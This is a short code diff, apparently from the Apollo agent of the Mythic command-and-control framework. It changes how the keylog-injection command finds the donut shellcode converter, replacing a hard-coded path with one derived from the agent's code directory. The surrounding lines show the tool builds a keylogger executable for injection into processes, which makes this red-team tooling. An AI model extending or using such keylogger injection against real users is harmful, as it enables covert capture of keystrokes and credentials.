@@ -9,6 +9,8 @@ from os import path
 from apollo.mythic.sRDI import ShellcodeRDI
 from mythic_container.MythicRPC import *
 import base64
+import os
+import asyncio
 
 KEYLOG_INJECT_PATH = "/srv/KeyLogInject.exe"
 
@@ -66,7 +68,7 @@ class KeylogInjectCommand(CommandBase):
         if not path.exists(KEYLOG_INJECT_PATH):
             await self.build_keyloginject()
             
-        donutPath = "/Mythic/agent_code/donut"
+        donutPath = os.path.abspath(self.agent_code_path / "donut")
         if not path.exists(donutPath):
             raise Exception("Could not find {}".format(donutPath))
         command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
